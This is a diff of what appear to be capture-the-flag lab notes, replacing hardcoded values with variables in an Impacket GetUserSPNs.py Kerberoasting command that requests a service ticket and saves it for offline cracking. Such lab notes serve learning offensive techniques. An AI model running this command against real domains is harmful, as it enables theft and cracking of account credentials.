@@ -25,7 +25,7 @@ python3 ${IMPACKET_SCRIPTS}/GetUserSPNs.py -dc-ip ${DC_IP} ${DOMAIN}/${DOMAIN_US
 Now, we can request the TGS for the found user:
 
 ```
-python3 $IMPACKET_SCRIPTS/GetUserSPNs.py -dc-ip 10.10.70.248 THM.red/${DOMAIN_USER}:${DOMAIN_USER_PW}! -request-user ${SPN} -outputfile tgs.txt 
+python3 $IMPACKET_SCRIPTS/GetUserSPNs.py -dc-ip ${DC_IP} ${DOMAIN}/${DOMAIN_USER}:${DOMAIN_USER_PW} -request-user ${SPN_ACCOUNT} -outputfile tgs.txt 
 
 
 ```
